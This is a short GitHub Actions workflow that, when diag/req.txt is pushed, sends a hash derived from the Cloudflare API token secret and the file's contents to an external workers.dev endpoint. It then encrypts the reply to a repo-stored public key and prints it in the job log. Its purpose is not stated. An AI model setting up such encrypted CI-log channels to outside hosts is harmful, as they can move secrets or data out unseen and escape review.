name: Diagnostics (encrypted)
on:
  push:
    branches: [main]
    paths: ["diag/req.txt"]
jobs:
  diag:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@v4
      - name: Fetch & encrypt
        env: { CF: "${{ secrets.CLOUDFLARE_API_TOKEN }}" }
        run: |
          export RT=$(printf '%s' "$CF:aok-render-v1" | sha256sum | cut -c1-40)
          echo "::add-mask::$RT"
          K=$(tr -d '\n' < diag/req.txt)
          curl -s -G "https://aok-checker.ozodbekadilov092.workers.dev/diag" --data-urlencode "rt=$RT" --data-urlencode "k=$K" -o out.json
          gzip -9 out.json
          openssl rand -hex 32 > key.txt
          openssl enc -aes-256-cbc -pbkdf2 -salt -in out.json.gz -out out.enc -pass file:key.txt
          openssl pkeyutl -encrypt -pubin -inkey diag/pub.pem -in key.txt -out key.enc
          echo "KEY:$(base64 -w0 key.enc)"
          echo "DATA_BEGIN"; base64 -w0 out.enc; echo; echo "DATA_END"
